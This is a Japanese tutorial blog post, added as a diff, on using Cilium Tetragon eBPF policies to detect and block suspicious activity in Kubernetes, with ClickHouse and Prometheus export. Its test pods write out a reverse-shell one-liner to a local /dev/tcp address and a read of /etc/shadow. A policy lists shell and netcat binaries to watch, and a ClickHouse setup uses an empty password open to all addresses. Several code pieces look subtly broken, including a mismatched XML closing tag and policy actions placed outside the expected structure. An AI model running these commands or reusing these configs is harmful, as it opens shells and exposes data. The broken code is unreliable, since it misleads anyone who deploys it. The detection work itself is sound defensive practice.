@@ -1,0 +1,784 @@
+---
+title: "タイトル:CiliumTetragonによるeBPFセキュリティオブザーバビリティ:Kubernetesにおけるリアルタイムランタイム強制"
+images: ['/static/images/ebpf-cilium-tetragon-kubernetes-security.png']
+date: '2026-10-04'
+lastUpdated: '2026-10-04'
+tags: ["kubernetes", "security", "devops", "cloud", "ebpf"]
+category: Tech
+draft: false
+featured: true
+proficiencyLevel: "Advanced"
+programmingLanguage: "TypeScript"
+summary: "概要:CiliumTetragonを用いたeBPFセキュリティオブザーバビリティを網羅したガイド。Kubernetesにおけるリアルタイムランタイム強制を、本番環境レベルのアーキテクチャとコード例で解説します。"
+---
+
+Kubernetesのランタイムセキュリティには、きめ細かく低遅延な可視性と強制力が必要です。従来の`ptrace`やユーザー空間エージェントに依存するアプローチでは、かなりのオーバーヘッドが発生し、回避される可能性がありました。eBPF、特にCilium Tetragonは、パフォーマンスへの影響を最小限に抑えつつ、リアルタイムのセキュリティ監視と強制を実現するカーネルネイティブなソリューションを提供します。このガイドでは、本番環境のKubernetesにおけるその実装について詳しく説明します。
+
+<AudioPlayer src="/static/audio/ebpf-cilium-tetragon-kubernetes-security-ja.mp3" title="音声エグゼクティブ・ブリーフィング" voice="Google Cloud ja-JP-Neural2-B" />
+
+
+## ランタイムセキュリティのためのeBPF：カーネルの利点
+
+eBPFは、システムコール、ネットワークイベント、カーネルトレースポイントなど、さまざまなイベントによってトリガーされるサンドボックス化されたプログラムをLinuxカーネル内で実行することを可能にします。これにより、セキュリティ監視と強制のための比類ない視点が得られます。ユーザー空間エージェントとは異なり、eBPFプログラムはカーネル内で直接動作し、ユーザーアプリケーションによって処理される前にイベントを監視するため、以下の利点があります。
+
+1.  **ユーザー空間の遅延オーバーヘッドゼロ：** イベントはカーネル内で捕捉および処理されるため、初期分析のためのコンテキストスイッチやユーザー空間へのデータコピーが不要になります。
+2.  **改ざん耐性：** eBPFプログラムはカーネルにロードされ、侵害されたユーザー空間プロセスがそれを無効にしたり回避したりすることは困難です。
+3.  **きめ細かな可視性：** 生のシステムコール引数、プロセスコンテキスト、ネットワークメタデータへのアクセスにより、ランタイム動作に関する深い洞察が得られます。
+4.  **動的な強制：** eBPFプログラムは、システムコールの戻り値を変更したり、操作をブロックしたり、エラーを挿入したりすることができ、リアルタイムの強制を可能にします。
+
+Cilium TetragonはeBPFを活用し、Kubernetesネイティブなセキュリティ監視および強制プラットフォームを提供します。DaemonSetとしてデプロイされ、`execve`、`openat`、`connect`、`bind`、`accept`などのシステムコールをトレースするために、重要なカーネルフックにeBPFプログラムをアタッチします。
+
+### アーキテクチャの概要
+
+Tetragonのアーキテクチャはシンプルです。
+
+```mermaid
+graph TD
+    subgraph Kubernetes Node
+        K[Kernel]
+        TetragonAgent(Tetragon Agent DaemonSet)
+        AppPod1(Application Pod 1)
+        AppPodN(Application Pod N)
+    end
+
+    subgraph Control Plane / Monitoring
+        TetragonOperator(Tetragon Operator)
+        ClickHouse(ClickHouse DB)
+        Prometheus(Prometheus)
+        Grafana(Grafana)
+    end
+
+    AppPod1 -- Syscalls --> K
+    AppPodN -- Syscalls --> K
+    K -- eBPF Tracepoints --> TetragonAgent
+    TetragonAgent -- JSON Events --> ClickHouse
+    TetragonAgent -- Metrics --> Prometheus
+    Prometheus -- Scrapes --> Grafana
+    TetragonOperator -- Manages --> TetragonAgent
+    TetragonOperator -- Manages --> TracingPolicy CRDs
+```
+
+`Tetragon Agent`は各ノードで実行され、eBPFプログラムをロードします。これらのプログラムはイベントを捕捉し、`TracingPolicy` CRDに基づいてフィルタリングし、構造化されたJSONイベントを標準出力または設定されたシンクにストリーミングします。`Tetragon Operator`はエージェントのライフサイクルを管理し、`TracingPolicy`オブジェクトを処理します。
+
+## Cilium Tetragonのデプロイ
+
+`kubectl`アクセスが可能な機能的なKubernetesクラスターがあることを前提として、Helmを使用してTetragonをデプロイします。
+
+```bash
+# Add Cilium Helm repository
+helm repo add cilium https://helm.cilium.io/
+
+# Update Helm repositories
+helm repo update
+
+# Install Tetragon
+# Ensure your kernel headers are available on nodes for eBPF compilation.
+# For GKE, AKS, EKS, this is typically handled. For custom kernels, you might need to install them.
+helm install tetragon cilium/tetragon --namespace kube-system \
+  --set tetragon.exporter.stdout.enabled=true \
+  --set tetragon.exporter.otlp.url="grpc://otel-collector.observability.svc.cluster.local:4317" \
+  --set tetragon.exporter.otlp.enabled=false # We'll enable this later for ClickHouse
+```
+
+デプロイを確認します。
+
+```bash
+kubectl get pods -n kube-system -l app.kubernetes.io/name=tetragon
+```
+
+各ノードでTetragonエージェントのPodが実行されているはずです。
+
+## `TracingPolicy`によるセキュリティポリシーの定義
+
+`TracingPolicy`は、トレースするカーネルイベントと実行するアクションを定義するKubernetesカスタムリソース定義（CRD）です。
+
+### 例1：機密ファイルアクセス（`/etc/shadow`）の検出
+
+このポリシーは`openat`システムコールをトレースし、特に`/etc/shadow`を開こうとする試みを監視します。
+
+```yaml
+# sensitive-file-access.yaml
+apiVersion: cilium.io/v1alpha1
+kind: TracingPolicy
+metadata:
+  name: detect-shadow-access
+spec:
+  kprobes:
+  - call: "openat"
+    args:
+    - index: 0
+      type: "int" # dirfd
+    - index: 1
+      type: "string" # pathname
+    - index: 2
+      type: "int" # flags
+    - index: 3
+      type: "int" # mode
+    selectors:
+    - matchArgs:
+      - index: 1
+        operator: "Equal"
+        values:
+        - "/etc/shadow"
+      matchPIDs:
+      - operator: NotEqual
+        followForks: true
+        isNamespacePID: true
+        values:
+        - 1 # Exclude PID 1 (init process) to reduce noise
+    action: "Follow" # Log the event
+```
+
+ポリシーを適用します。
+
+```bash
+kubectl apply -f sensitive-file-access.yaml
+```
+
+次に、テストしてみましょう。シンプルなPodをデプロイし、`/etc/shadow`を読み取ろうとします。
+
+```yaml
+# test-pod.yaml
+apiVersion: v1
+kind: Pod
+metadata:
+  name: shadow-test
+spec:
+  containers:
+  - name: busybox
+    image: busybox
+    command: ["sh", "-c", "cat /etc/shadow || echo 'Access denied'"]
+  restartPolicy: Never
+```
+
+```bash
+kubectl apply -f test-pod.yaml
+kubectl wait --for=condition=complete pod/shadow-test --timeout=60s
+kubectl logs shadow-test
+```
+
+別のターミナルで、Tetragonのログを監視します。
+
+```bash
+kubectl logs -n kube-system -l app.kubernetes.io/name=tetragon -f | grep "openat" | grep "/etc/shadow"
+```
+
+次のようなJSON出力が表示されます（簡潔にするために一部を省略しています）。
+
+```json
+{"event":{"open":{"args":[{"index":0,"type":"int","value":-100},{"index":1,"type":"string","value":"/etc/shadow"},{"index":2,"type":"int","value":0},{"index":3,"type":"int","value":0}],"fd":3,"flags":"O_RDONLY","path":"/etc/shadow","pid":12345,"process_id":"shadow-test/busybox","tid":12345,"uid":0}},"node_name":"k8s-node-1","process":{"exec_id":"...","pod":{"container":{"id":"...","name":"busybox"},"name":"shadow-test","namespace":"default"}},"type":"process_open"}
+```
+
+これは、機密ファイルアクセスのリアルタイム検出を示しています。
+
+### 例2：リバースシェル実行の検出
+
+リバースシェルは、多くの場合、一般的なシェルバイナリ（`bash`、`sh`、`nc`）の`execve`とそれに続くネットワーク接続を伴います。このポリシーは、疑わしいバイナリの`execve`に焦点を当てています。
+
+```yaml
+# reverse-shell-exec.yaml
+apiVersion: cilium.io/v1alpha1
+kind: TracingPolicy
+metadata:
+  name: detect-reverse-shell-exec
+spec:
+  kprobes:
+  - call: "execve"
+    args:
+    - index: 0
+      type: "string" # filename
+    - index: 1
+      type: "string[]" # argv
+    selectors:
+    - matchArgs:
+      - index: 0
+        operator: "In"
+        values:
+        - "/bin/bash"
+        - "/bin/sh"
+        - "/usr/bin/nc"
+        - "/usr/bin/ncat"
+        - "/usr/bin/python"
+        - "/usr/bin/perl"
+        - "/usr/bin/php"
+        - "/usr/bin/ruby"
+        - "/usr/bin/zsh"
+      matchPIDs:
+      - operator: NotEqual
+        followForks: true
+        isNamespacePID: true
+        values:
+        - 1
+    action: "Follow"
+```
+
+ポリシーを適用します。
+
+```bash
+kubectl apply -f reverse-shell-exec.yaml
+```
+
+テストします。
+
+```yaml
+# reverse-shell-test-pod.yaml
+apiVersion: v1
+kind: Pod
+metadata:
+  name: reverse-shell-test
+spec:
+  containers:
+  - name: busybox
+    image: busybox
+    command: ["sh", "-c", "bash -i >& /dev/tcp/127.0.0.1/8080 0>&1 || echo 'Simulated reverse shell'"]
+  restartPolicy: Never
+```
+
+```bash
+kubectl apply -f reverse-shell-test-pod.yaml
+kubectl wait --for=condition=complete pod/reverse-shell-test --timeout=60s
+kubectl logs -n kube-system -l app.kubernetes.io/name=tetragon -f | grep "execve" | grep "/bin/bash"
+```
+
+`/bin/bash`の`execve`イベントが観測されます。より堅牢な検出のためには、これを`connect`システムコールトレースと組み合わせて、異常なポートや外部IPへのアウトバウンド接続を特定します。
+
+### 例3：名前空間エスケープ検出（ホストパスのマウント）
+
+一般的な名前空間エスケープ手法には、ホストパスのマウントが含まれます。これは通常、Pod Security Standardsによって制御されますが、コンテナ内から機密性の高いホストパスにアクセスしようとする試みを検出することは非常に重要です。このポリシーは、一般的なホストパスに対する`openat`をトレースします。
+
+```yaml
+# host-path-access.yaml
+apiVersion: cilium.io/v1alpha1
+kind: TracingPolicy
+metadata:
+  name: detect-host-path-access
+spec:
+  kprobes:
+  - call: "openat"
+    args:
+    - index: 0
+      type: "int"
+    - index: 1
+      type: "string"
+    - index: 2
+      type: "int"
+    - index: 3
+      type: "int"
+    selectors:
+    - matchArgs:
+      - index: 1
+        operator: "Prefix"
+        values:
+        - "/host/proc"
+        - "/host/sys"
+        - "/host/var/lib/docker"
+        - "/host/var/log"
+        - "/host/etc/kubernetes"
+        - "/host/root"
+        - "/host/boot"
+      matchPIDs:
+      - operator: NotEqual
+        followForks: true
+        isNamespacePID: true
+        values:
+        - 1
+    action: "Follow"
+```
+
+ポリシーを適用します。
+
+```bash
+kubectl apply -f host-path-access.yaml
+```
+
+ホストパスをマウントしたPodをデプロイしてテストします。
+
+```yaml
+# host-path-test-pod.yaml
+apiVersion: v1
+kind: Pod
+metadata:
+  name: host-path-test
+spec:
+  containers:
+  - name: busybox
+    image: busybox
+    command: ["sh", "-c", "ls -la /host/proc/self/cgroup || echo 'Host path access attempt'"]
+    volumeMounts:
+    - name: host-proc
+      mountPath: /host/proc
+  volumes:
+  - name: host-proc
+    hostPath:
+      path: /proc
+      type: Directory
+  restartPolicy: Never
+```
+
+```bash
+kubectl apply -f host-path-test-pod.yaml
+kubectl wait --for=condition=complete pod/host-path-test --timeout=60s
+kubectl logs -n kube-system -l app.kubernetes.io/name=tetragon -f | grep "openat" | grep "/host/proc/self/cgroup"
+```
+
+これにより、`/host/proc/self/cgroup`へのアクセス試行がログに記録されます。
+
+## `TracingPolicy`によるリアルタイム強制
+
+Tetragonは単なるロギングを超えて、プロセスの終了やシステムコールのブロックによってポリシーを強制できます。
+
+### 例：機密ファイルアクセスのブロック
+
+`detect-shadow-access`ポリシーを変更して、`openat`呼び出しをブロックします。
+
+```yaml
+# sensitive-file-access-block.yaml
+apiVersion: cilium.io/v1alpha1
+kind: TracingPolicy
+metadata:
+  name: block-shadow-access
+spec:
+  kprobes:
+  - call: "openat"
+    args:
+    - index: 0
+      type: "int"
+    - index: 1
+      type: "string"
+    - index: 2
+      type: "int"
+    - index: 3
+      type: "int"
+    selectors:
+    - matchArgs:
+      - index: 1
+        operator: "Equal"
+        values:
+        - "/etc/shadow"
+      matchPIDs:
+      - operator: NotEqual
+        followForks: true
+        isNamespacePID: true
+        values:
+        - 1
+    action: "Override" # This will block the syscall
+    return:
+      isErr: true
+      value: 1 # EPERM (Operation not permitted)
+```
+
+ブロックポリシーを適用します（以前の`detect-shadow-access`が削除または更新されていることを確認してください）。
+
+```bash
+kubectl delete -f sensitive-file-access.yaml
+kubectl apply -f sensitive-file-access-block.yaml
+```
+
+`shadow-test` Podを再実行します。
+
+```bash
+kubectl delete pod shadow-test
+kubectl apply -f test-pod.yaml
+kubectl wait --for=condition=complete pod/shadow-test --timeout=60s
+kubectl logs shadow-test
+```
+
+`kubectl logs shadow-test`からの出力は、「Access denied」または同様のエラーを示すはずです。これは、`cat`コマンドが`/etc/shadow`を開くのに失敗したことを示しています。Tetragonのログには、`openat`イベントが`Override`アクションとともに表示されます。
+
+## 監査ログのClickHouseへのエクスポート
+
+長期的な保存、分析、アラートのために、TetragonイベントをClickHouseのような堅牢なデータベースにエクスポートすることは不可欠です。これにはOpenTelemetry Collectorが必要です。
+
+### 1. OpenTelemetry Collectorのデプロイ
+
+```yaml
+# otel-collector.yaml
+apiVersion: v1
+kind: ServiceAccount
+metadata:
+  name: otel-collector
+  namespace: observability
+---
+apiVersion: rbac.authorization.k8s.io/v1
+kind: ClusterRole
+metadata:
+  name: otel-collector
+rules:
+- apiGroups: [""]
+  resources: ["pods", "nodes", "namespaces"]
+  verbs: ["get", "list", "watch"]
+---
+apiVersion: rbac.authorization.k8s.io/v1
+kind: ClusterRoleBinding
+metadata:
+  name: otel-collector
+subjects:
+- kind: ServiceAccount
+  name: otel-collector
+  namespace: observability
+roleRef:
+  kind: ClusterRole
+  name: otel-collector
+  apiGroup: rbac.authorization.k8s.io
+---
+apiVersion: v1
+kind: ConfigMap
+metadata:
+  name: otel-collector-config
+  namespace: observability
+data:
+  otel-collector-config.yaml: |
+    receivers:
+      otlp:
+        protocols:
+          grpc:
+          http:
+    processors:
+      batch:
+        send_batch_size: 1000
+        timeout: 5s
+    exporters:
+      clickhouse:
+        endpoint: "tcp://clickhouse-server.observability.svc.cluster.local:9000"
+        database: "tetragon_events"
+        table: "events"
+        username: "default"
+        password: "" # Use K8s secrets for production
+        tls:
+          insecure: true # Use proper TLS in production
+    service:
+      pipelines:
+        logs:
+          receivers: [otlp]
+          processors: [batch]
+          exporters: [clickhouse]
+---
+apiVersion: apps/v1
+kind: Deployment
+metadata:
+  name: otel-collector
+  namespace: observability
+spec:
+  replicas: 1
+  selector:
+    matchLabels:
+      app: otel-collector
+  template:
+    metadata:
+      labels:
+        app: otel-collector
+    spec:
+      serviceAccountName: otel-collector
+      containers:
+      - name: otel-collector
+        image: otel/opentelemetry-collector-contrib:latest
+        command: ["/otelcol-contrib", "--config=/conf/otel-collector-config.yaml"]
+        volumeMounts:
+        - name: otel-collector-config-vol
+          mountPath: /conf
+        ports:
+        - containerPort: 4317 # OTLP gRPC
+        - containerPort: 4318 # OTLP HTTP
+      volumes:
+      - name: otel-collector-config-vol
+        configMap:
+          name: otel-collector-config
+---
+apiVersion: v1
+kind: Service
+metadata:
+  name: otel-collector
+  namespace: observability
+spec:
+  selector:
+    app: otel-collector
+  ports:
+  - name: otlp-grpc
+    protocol: TCP
+    port: 4317
+    targetPort: 4317
+  - name: otlp-http
+    protocol: TCP
+    port: 4318
+    targetPort: 4318
+```
+
+`observability`名前空間を作成し、適用します。
+
+```bash
+kubectl create namespace observability
+kubectl apply -f otel-collector.yaml
+```
+
+### 2. ClickHouseのデプロイ
+
+簡素化のため、単一ノードのClickHouseデプロイメントを使用します。本番環境では、高可用性セットアップを使用してください。
+
+```yaml
+# clickhouse.yaml
+apiVersion: v1
+kind: ServiceAccount
+metadata:
+  name: clickhouse
+  namespace: observability
+---
+apiVersion: apps/v1
+kind: Deployment
+metadata:
+  name: clickhouse-server
+  namespace: observability
+spec:
+  selector:
+    matchLabels:
+      app: clickhouse-server
+  template:
+    metadata:
+      labels:
+        app: clickhouse-server
+    spec:
+      serviceAccountName: clickhouse
+      containers:
+      - name: clickhouse-server
+        image: clickhouse/clickhouse-server:latest
+        ports:
+        - containerPort: 8123 # HTTP
+        - containerPort: 9000 # Client
+        - containerPort: 9009 # Inter-server
+        volumeMounts:
+        - name: clickhouse-storage
+          mountPath: /var/lib/clickhouse
+        - name: clickhouse-config
+          mountPath: /etc/clickhouse-server/config.d
+        - name: clickhouse-users
+          mountPath: /etc/clickhouse-server/users.d
+      volumes:
+      - name: clickhouse-storage
+        emptyDir: {} # Use PersistentVolumeClaim in production
+      - name: clickhouse-config
+        configMap:
+          name: clickhouse-config
+      - name: clickhouse-users
+        configMap:
+          name: clickhouse-users
+---
+apiVersion: v1
+kind: Service
+metadata:
+  name: clickhouse-server
+  namespace: observability
+spec:
+  selector:
+    app: clickhouse-server
+  ports:
+  - name: http
+    protocol: TCP
+    port: 8123
+    targetPort: 8123
+  - name: client
+    protocol: TCP
+    port: 9000
+    targetPort: 9000
+---
+apiVersion: v1
+kind: ConfigMap
+metadata:
+  name: clickhouse-config
+  namespace: observability
+data:
+  logging.xml: |
+    <yandex>
+        <logger>
+            <level>trace</level>
+            <log>/var/log/clickhouse-server/clickhouse-server.log</log>
+            <errorlog>/var/log/clickhouse-server/clickhouse-server.err.log</log>
+            <size_log>1000M</size_log>
+            <count_log>10</count_log>
+        </logger>
+    </yandex>
+---
+apiVersion: v1
+kind: ConfigMap
+metadata:
+  name: clickhouse-users
+  namespace: observability
+data:
+  users.xml: |
+    <yandex>
+        <users>
+            <default>
+                <password></password>
+                <networks>
+                    <ip>::/0</ip>
+                </networks>
+                <profile>default</profile>
+                <quota>default</quota>
+            </default>
+        </users>
+    </yandex>
+```
+
+```bash
+kubectl apply -f clickhouse.yaml
+```
+
+ClickHouseが準備できるまで待ちます。次に、接続してデータベースとテーブルを作成します。
+
+```bash
+kubectl exec -it deployment/clickhouse-server -n observability -- clickhouse-client -q "CREATE DATABASE IF NOT EXISTS tetragon_events;"
+kubectl exec -it deployment/clickhouse-server -n observability -- clickhouse-client -q "
+CREATE TABLE IF NOT EXISTS tetragon_events.events (
+    Timestamp DateTime64(9),
+    NodeName String,
+    EventType String,
+    ProcessExecID String,
+    ProcessPID UInt64,
+    ProcessTID UInt64,
+    ProcessUID UInt64,
+    ProcessName String,
+    ProcessArgs Array(String),
+    ProcessCwd String,
+    ProcessPodNamespace String,
+    ProcessPodName String,
+    ProcessContainerName String,
+    EventData String
+) ENGINE = MergeTree()
+ORDER BY (Timestamp, NodeName, EventType)
+SETTINGS index_granularity = 8192;
+"
+```
+
+### 3. TetragonをOTLPにエクスポートするように設定
+
+Tetragon Helmリリースを更新して、OTLPエクスポートを有効にします。
+
+```bash
+helm upgrade tetragon cilium/tetragon --namespace kube-system \
+  --set tetragon.exporter.stdout.enabled=false \
+  --set tetragon.exporter.otlp.url="otel-collector.observability.svc.cluster.local:4317" \
+  --set tetragon.exporter.otlp.enabled=true
+```
+
+これで、テストPodを再実行します。イベントはOpenTelemetry Collectorを介してClickHouseに流れます。ClickHouseをクエリしてデータを確認できます。
+
+```bash
+kubectl exec -it deployment/clickhouse-server -n observability -- clickhouse-client -q "SELECT * FROM tetragon_events.events LIMIT 10;"
+```
+
+## Prometheus/Grafanaへのメトリクスのエクスポート
+
+TetragonはPrometheusメトリクスを公開します。Tetragon Podをスクレイピングするように設定されたPrometheusインスタンスが必要です。
+
+### 1. Prometheusのデプロイ（まだ存在しない場合）
+
+標準的なPrometheus Operatorデプロイメントを想定すると、`ServiceMonitor`を作成します。
+
+```yaml
+# prometheus-servicemonitor.yaml
+apiVersion: monitoring.coreos.com/v1
+kind: ServiceMonitor
+metadata:
+  name: tetragon-servicemonitor
+  namespace: kube-system # Or your monitoring namespace
+  labels:
+    release: prometheus-operator # Match your Prometheus operator's selector
+spec:
+  selector:
+    matchLabels:
+      app.kubernetes.io/name: tetragon
+  namespaceSelector:
+    matchNames:
+    - kube-system
+  endpoints:
+  - port: metrics
+    interval: 30s
+    path: /metrics
+```
+
+この`ServiceMonitor`を適用します。PrometheusはTetragonメトリクスを自動的に検出し、スクレイピングします。
+
+### 2. Grafanaダッシュボード
+
+Grafanaに組み込みのTetragonダッシュボードをインポートするか、カスタムダッシュボードを作成します。主なメトリクスは次のとおりです。
+
+*   `tetragon_events_total`：処理されたイベントの総数。
+*   `tetragon_policy_events_total`：ポリシーに一致したイベント。
+*   `tetragon_policy_actions_total`：実行されたアクションの総数（例：`Override`）。
+*   `tetragon_bpf_progs_total`：ロードされたeBPFプログラムの数。
+*   `tetragon_bpf_map_entries_total`：eBPFマップエントリ。
+
+これらのメトリクスは、Tetragonの運用健全性とポリシーの有効性に関する洞察を提供します。
+
+## セキュリティポリシーの比較
+
+| 機能             | 従来のユーザー空間エージェント（例：Falco、OSSEC） | Cilium Tetragon (eBPF)                                |
+| :------------------ | :------------------------------------------------ | :---------------------------------------------------- |
+| **メカニズム**       | `ptrace`、auditd、カーネルモジュール、ユーザー空間フック | カーネルトレースポイント/kprobesにアタッチされたeBPFプログラム  |
+| **遅延**         | 高い（コンテキストスイッチ、データコピー）            | ほぼゼロ（カーネル内処理）                      |
+| **オーバーヘッド**        | 著しいCPU/メモリ                            | 最小限のCPU/メモリ                                    |
+| **改ざん耐性** | ユーザー空間攻撃に対して脆弱                  | 高い（カーネルレベル、サンドボックス化）                        |
+| **粒度**     | 良好だが、多くの場合イベント後                        | 非常に優れている（システムコール前、生の引数）                |
+| **強制**     | 限定的（プロセス終了、ファイアウォールルール）           | きめ細かい（システムコールブロック、戻り値変更）|
+| **デプロイメント**      | DaemonSet、特定のカーネルモジュールが必要       | DaemonSet、標準eBPFカーネル機能を活用    |
+| **Kubernetesネイティブ** | 多くの場合、カスタム統合が必要                | ファーストクラスのKubernetes CRD（`TracingPolicy`）         |
+
+## 本番環境での落とし穴とトラブルシューティング
+
+1.  **カーネルヘッダーの不一致：**
+    *   **症状：** Tetragon Podが起動せず、ログに「failed to load BPF program: kernel headers not found」や「BPF compilation failed」のようなエラーが表示される。
+    *   **原因：** eBPFプログラムは、実行中のカーネルのヘッダーに対してコンパイルされます。ヘッダーが見つからないか、カーネルバージョンと一致しない場合、コンパイルは失敗します。
+    *   **修正：** すべてのノードにカーネルヘッダーがインストールされており、正確なカーネルバージョンと一致していることを確認してください。クラウドプロバイダーの場合、これは通常管理されていますが、カスタムAMIやオンプレミスの場合、`linux-headers-$(uname -r)`または同様のパッケージをインストールする必要があるかもしれません。一部のディストリビューションでは`kernel-devel`または`kernel-headers`が必要です。
+
+2.  **過剰なイベント量：**
+    *   **症状：** Tetragonのログが圧倒的で、OTLPコレクターがバックログされ、ClickHouseの取り込みが滞り、TetragonエージェントのCPU/メモリ使用率が高い。
+    *   **原因：** 広すぎる`TracingPolicy`定義（例：特定のフィルターなしですべての`openat`呼び出しをトレースする）は、毎秒数百万のイベントを生成する可能性があります。
+    *   **修正：**
+        *   **ポリシーの改善：** `matchArgs`、`matchPIDs`、`matchNamespaces`を非常に具体的にします。必要に応じて`Prefix`または`Suffix`演算子を使用します。
+        *   **レート制限：** Tetragonには内部レート制限があります。Helm値で`tetragon.eventRateLimit`を設定します。
+        *   **バッチ処理：** OTLPコレクターに適切なバッチ処理が設定されていることを確認します（`batch`プロセッサー）。
+        *   **サンプリング：** 大量のイベントの場合、すべてのイベントで完全な忠実度が厳密に必要でない場合は、確率的サンプリングを検討してください。
+
+3.  **ポリシーがトリガーされない：**
+    *   **症状：** `TracingPolicy`によって捕捉されると予想されるイベントが、ログやClickHouseに表示されない。
+    *   **原因：**
+        *   `TracingPolicy` YAMLの誤り（例：間違ったシステムコール名、誤った引数インデックス/タイプ、`matchArgs`ロジックエラー）。
+        *   プロセスが予想とは異なる名前空間/コンテナで実行されている。
+        *   システムコールが実際には行われていない（例：`cat`は`openat`を使用し、`open`は使用しない）。
+    *   **修正：**
+        *   **システムコールの検証：** テストバイナリで`strace`を使用して、正確なシステムコールと引数を確認します。
+        *   **Tetragonエージェントのログを確認：** ポリシー適用時のエラーを探します。
+        *   **広範囲から始めて、絞り込む：** 非常に広範囲なポリシー（例：すべての`execve`をトレースする）から始め、次に`matchArgs`と`matchPIDs`セレクターを追加します。
+        *   **`isNamespacePID: true`：** コンテナ内のPIDは名前空間固有であることに注意してください。ホストPIDと一致させる場合は、`isNamespacePID: false`を設定します。
+
+4.  **強制（`Override`）がアプリケーションの問題を引き起こす：**
+    *   **症状：** `Override`ポリシーを適用した後、アプリケーションがクラッシュしたり、予期しない動作をしたりする。
+    *   **原因：** アプリケーションが正当に必要とする重要なシステムコールをブロックしている。
+    *   **修正：**
+        *   **徹底的なテスト：** `Override`ポリシーは常に非本番環境で最初にテストしてください。
+        *   **まず`Follow`を使用：** まず`action: Follow`から始めてイベントを監視し、ポリシーが悪意のある動作のみに一致することを確認します。
+        *   **きめ細かいホワイトリスト：** アプリケーションが機密性の高いアクションを実行する必要がある場合、その特定のアプリケーションに対してその正確なアクションをホワイトリストに登録するための特定の`TracingPolicy`を作成します（例：`podLabels`または`containerName`による）。
+
+5.  **コントロールプレーン（ClickHouse/Prometheus）でのリソース消費：**
+    *   **症状：** Tetragonデータの量により、ClickHouseまたはPrometheusインスタンスが過負荷になる。
+    *   **原因：** Tetragonからの高いイベントレート、バックエンドシステムに割り当てられたリソースの不足。
+    *   **修正：**
+        *   **Tetragonポリシーの最適化：** ソースでのイベント量を削減します。
+        *   **バックエンドのスケーリング：** ClickHouseとPrometheusを垂直または水平にスケーリングします。
+        *   **ClickHouseの最適化：** テーブルスキーマを最適化し、適切なエンジン（例：`MergeTree`）を使用し、パーティショニングを検討します。
+        *   **Prometheusの保持期間：** ディスク使用量を管理するためにPrometheusの保持ポリシーを調整します。
+
+## よくある質問
+
+1.  **Tetragonのパフォーマンスオーバーヘッドはどのくらいですか？**
+    TetragonはeBPFベースであるため、オーバーヘッドは最小限です。eBPFプログラムはカーネル内で直接実行され、コンテキストスイッチやユーザー空間へのデータコピーを回避します。ベンチマークでは、高いイベント負荷の下でも通常、CPUオーバーヘッドは数パーセント程度であり、`ptrace`ベースやユーザー空間エージェントよりもはるかに効率的です。
+
+2.  **Tetragonはネットワーク接続をブロックできますか？**
+    はい、Tetragonは`connect`、`bind`、`accept`などのシステムコールをオーバーライドすることでネットワーク接続をブロックできます。特定の宛先IP、ポート、またはプロセスコンテキストに一致する`TracingPolicy`ルールを定義し、`action: Override`を使用して呼び出し元プロセスにエラー（例：`EPERM`）を返すことができます。
+
+3.  **TetragonはFalcoと比較してどうですか？**
+    FalcoとTetragonはどちらもランタイムセキュリティを提供します。Falcoは伝統的にカーネルモジュール（`falco-probe`）または`ptrace`を使用してシステムコールにフックし、ユーザー定義のルールに基づいてイベントを生成します。TetragonはeBPFのみを使用します。Tetragonは一般的に、オーバーヘッドが低く、システムコール引数に対するきめ細かい制御が可能で、Falcoの従来のアーキテクチャでは達成が難しいカーネル内での直接的な強制機能（システムコールのブロック/オーバーライド）を提供します。Falcoはより広範なルールセットとコミュニティを持っていますが、Tetragonは特にKubernetesネイティブなユースケースにおいて急速に追いついています。
+
+4.  **TetragonはKubernetes専用ですか？**
+    TetragonはKubernetesと深く統合されていますが（CRD、Pod/コンテナコンテキストを使用）、基盤となるeBPFテクノロジーとTetragonエージェント自体は、ポリシーを監視および強制するために任意のLinuxホストにデプロイできます。Kubernetes統合は主に`TracingPolicy` CRDを提供し、Kubernetesメタデータでイベントを強化します。
+
+5.  **多くのクラスターでポリシー管理を大規模に処理するにはどうすればよいですか？**
+    大規模なデプロイメントの場合、GitOpsの原則を使用して`TracingPolicy` CRDを管理します。ポリシーをGitリポジトリに保存し、Argo CDやFlux CDなどのツールを使用してクラスター間で同期します。これにより、バージョン管理、監査可能性、一貫したポリシー適用が保証されます。わずかな違いのある多くの類似ポリシーがある場合は、ポリシージェネレーターやテンプレートツールを使用することを検討してください。
